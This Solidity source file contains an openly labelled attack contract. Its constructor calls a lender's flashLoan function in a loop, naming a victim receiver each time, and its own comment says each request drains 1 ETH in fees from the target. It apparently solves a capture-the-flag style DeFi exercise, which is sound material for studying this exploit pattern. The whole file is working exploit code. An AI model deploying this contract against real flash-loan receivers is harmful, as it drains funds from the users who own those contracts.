// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract AttackFlashLoanReceiver {
    constructor(
        address lender,
        address receiver,
        address token,
        uint256 amount,
        bytes memory data
    ) {
        bool success = true;

        // Repeatedly request loans for the attack target
        // draining 1 ETH for each request.
        while (success) {
            (success, ) = lender.call(
                abi.encodeWithSignature(
                    "flashLoan(address,address,uint256,bytes)",
                    receiver,
                    token,
                    amount,
                    data
                )
            );
        }
    }
}
